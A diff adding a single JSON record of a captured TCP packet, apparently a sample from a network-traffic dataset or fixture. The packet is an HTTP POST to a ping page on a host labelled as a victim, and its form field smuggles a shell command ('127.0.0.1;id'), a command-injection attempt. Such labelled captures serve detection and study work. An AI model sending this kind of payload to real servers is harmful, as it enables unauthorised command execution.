@@ -1,0 +1,1 @@
+{"protocol": "TCP", "transport": {"src_port": 37660, "dst_port": 80, "flags": "PA", "seq": 2598688271, "ack": 2715527349, "payload_length": 185, "payload": "POST /ping.php HTTP/1.1\r\nHost: victim.sanogo.de\r\nUser-Agent: curl/7.88.1\r\nAccept: */*\r\nContent-Length: 27\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nip=127.0.0.1;id&submit=Ping"}}
